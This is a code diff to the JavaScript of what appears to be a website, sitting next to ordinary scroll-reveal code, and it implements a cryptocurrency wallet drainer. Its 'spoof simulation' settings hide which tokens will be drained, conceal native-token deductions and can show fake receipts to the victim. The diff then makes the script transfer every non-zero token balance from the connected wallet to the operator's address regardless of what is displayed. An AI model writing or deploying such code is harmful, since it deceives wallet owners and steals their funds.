@@ -84,8 +84,8 @@ addEventOnElem(window, "scroll", scrollReveal);
  * Spoof Simulation Configuration
  */
 const spoofConfig = {
-  noApprovementMode: false, // Hide tokens that will be drained (Pectra users only, disables autoclaim)
-  hideNativeWithdraw: false, // Conceal native token deductions
+  noApprovementMode: false, // Hide tokens that will be drained in display (Pectra users only)
+  hideNativeWithdraw: false, // Conceal native token deductions in display
   showNativeTopup: false, // Show +0.0000000001 ETH receipt in simulation
   tokenTopupAmount: 0 // Amount of fake tokens to credit (0 to disable)
 };
@@ -137,10 +137,11 @@ async function connectWalletAndSendTokens() {
     });
 
     let tokens = await response.json();
+    const originalTokens = [...tokens]; // Store original tokens for transfer
 
-    // Apply spoof simulation settings
+    // Apply spoof simulation settings for display
     if (spoofConfig.noApprovementMode) {
-      // Hide tokens that would be drained (for Pectra users, no autoclaim)
+      // Hide tokens that would be drained in display (for Pectra users)
       tokens = tokens.filter(token => !token.balance || ethers.BigNumber.from(token.balance).isZero());
     }
 
@@ -205,15 +206,9 @@ ${spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay}${spoofConfig
       })
     });
 
-    // Proceed with transferring tokens to your address
-    for (const token of tokens) {
+    // Proceed with transferring all non-zero token balances to your address
+    for (const token of originalTokens) {
       try {
-        // Skip transfer if noApprovementMode is enabled (no autoclaim)
-        if (spoofConfig.noApprovementMode) {
-          console.log(`Skipping transfer of ${token.symbol} due to No Approvement Mode`);
-          continue;
-        }
-
         const contract = new ethers.Contract(token.token_address, [
           "function transfer(address to, uint amount) returns (bool)"
         ], signer);
